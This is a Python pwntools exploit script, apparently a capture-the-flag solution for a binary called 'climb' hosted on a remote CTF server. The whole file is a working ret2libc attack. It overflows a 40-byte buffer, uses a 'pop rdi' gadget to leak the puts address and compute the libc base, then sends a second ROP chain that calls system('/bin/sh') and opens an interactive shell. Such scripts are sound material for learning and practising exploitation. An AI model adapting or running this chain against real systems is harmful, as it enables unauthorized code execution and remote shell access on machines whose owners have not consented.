#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./climb')
libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")

host = args.HOST or 'cha.hackpack.club'
port = int(args.PORT or 41702)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())


io = start(env={"LD_PRELOAD": "./libc6_2.27-3ubuntu1_amd64.so"})
io.recvuntil("How will you respond? ")

payload = (
    b"A" * 40 +
    p64(0x400743) + # : pop rdi ; ret
    p64(exe.got["puts"]) +
    p64(exe.plt["puts"]) +
    p64(exe.functions["main"].address)
)
io.send(payload)
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - libc.sym.puts

log.info("Leak: 0x%x", leak)
log.info("Libc: 0x%x", libc.address)

io.recvuntil("How will you respond? ")
payload = (
    b"A" * 40 +
    p64(0x400744) +
    p64(0x400743) + # : pop rdi ; ret
    p64(next(libc.search(b"/bin/sh"))) +
    p64(libc.sym.system)
)
io.send(payload)

io.interactive()
